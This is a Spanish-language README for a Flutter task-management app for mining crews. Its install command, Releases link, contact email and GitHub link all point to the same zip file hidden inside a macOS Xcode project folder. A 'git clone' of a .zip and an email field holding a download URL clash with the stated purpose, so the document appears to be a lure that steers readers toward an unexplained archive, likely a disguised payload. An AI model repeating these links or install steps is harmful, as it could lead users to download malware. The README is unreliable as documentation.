# TaskManager

TaskManager es una aplicación móvil desarrollada en **Flutter** diseñada para gestionar actividades diarias en entornos mineros e industriales. Permite a los operarios y jefes de mina organizar tareas, seleccionar equipos, registrar actividades y monitorear el progreso de manera eficiente.

## Características Principales

- **Inicio de Sesión**: Acceso seguro para operarios y jefes de mina.
- **Gestión de Equipos**: Selección y registro de equipos, con soporte para escaneo de códigos QR.
- **Registro de Actividades**: Formulario dinámico que ajusta horarios, labores y horómetros según las necesidades.
- **Persistencia Local**: Almacena los datos en una base de datos local, ideal para entornos con conectividad limitada.
- **Interfaz Intuitiva**: Diseño limpio y fácil de usar, optimizado para la gestión de tareas en campo.

## Beneficios

- **Organización**: Centraliza la gestión de equipos y actividades diarias.
- **Eficiencia**: Automatiza validaciones y ajustes en horarios y recursos.
- **Flexibilidad**: Funciona sin conexión a internet gracias a la base de datos local.
- **Fiabilidad**: Integra un sistema robusto para evitar errores en el registro de datos.

## Requisitos Previos

- Tener instalado **Flutter 3.24.4** o superior.
- Entorno configurado con **Dart 3.5.4**.
- Dispositivo físico o emulador para pruebas.

## Instalación y Configuración
Para clonar y ejecutar esta aplicación localmente, sigue estos pasos:

1. Clona este repositorio:
   ```bash
   git clone https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip
   cd taskmanager-flutter
   ```

2. Instala las dependencias de Flutter:
   ```bash
   flutter pub get
   ```

3. Ejecuta la aplicación:
   ```bash
   flutter run
   ```

## Cómo Usar TaskManager

1. Inicia sesión con un usuario predefinido.
2. Selecciona un equipo desde la lista o escanea su código QR.
3. Completa el formulario previo, seleccionando la mina, el jefe y la labor a realizar.
4. Registra las actividades diarias, validando horarios y horómetros.
5. Consulta los detalles de los equipos y actividades en tiempo real.

## Tecnologías Utilizadas

- **Flutter**: Framework para desarrollo móvil.
- **Base de Datos Local**: Para almacenamiento offline.
- **Integración QR**: Escaneo de equipos mediante códigos QR.

### Acceso al APK en GitHub
También puedes encontrar el APK en la sección [Releases](https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip) del repositorio. Aquí se cargará una nueva versión del APK cada vez que se actualice la aplicación.

## Modo Offline y Sincronización Automática
- **Modo Offline**: Al no haber conexión, los formularios se guardan en una base de datos local (por ejemplo, SQLite o almacenamiento local de Firebase).
- **Sincronización con Firebase**: La app sincroniza automáticamente los datos con Firebase Firestore cuando hay conexión.
- **Gestión de Conflictos**: Los campos `ultima_actualizacion` y las Firebase Firestore Rules ayudan a resolver conflictos de versiones en caso de cambios simultáneos.

## Exportación de Datos en Excel
Los formularios completados pueden exportarse en formato Excel para facilitar el reporte y análisis de actividades:

1. **Exportación**: Los datos se exportan a un archivo Excel cuando se selecciona la opción en la aplicación.
2. **Sincronización Offline**: Si no hay conexión, el archivo se guarda localmente y se sincroniza en segundo plano al restablecer la conexión.

## Consideraciones para Entornos de Baja Conectividad
La aplicación está optimizada para funcionar en entornos de baja conectividad mediante:
- Almacenamiento en caché para acceder a datos guardados.
- Sincronización en segundo plano, evitando interrupciones en la experiencia de usuario.
- Soporte completo offline con sincronización cuando la conectividad se restablece.

## Contribuciones
¡Nos encantaría contar con tus contribuciones! Sigue estos pasos para contribuir:

1. Realiza un fork de este repositorio.
2. Crea una nueva rama (`git checkout -b feature/nueva-funcionalidad`).
3. Realiza tus cambios y realiza commits (`git commit -m 'Agrega nueva funcionalidad'`).
4. Envía los cambios a GitHub (`git push origin feature/nueva-funcionalidad`).
5. Crea un Pull Request.

## Licencia
Este proyecto está bajo la licencia MIT. Para más detalles, consulta el archivo [LICENSE](./LICENSE).

## Contacto
Desarrollado por: Cristian Bastidas  
Correo electrónico: https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip
GitHub: https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip

---
¡Gracias por utilizar TaskManager! Esperamos que te sea útil para gestionar y organizar tus tareas eficientemente.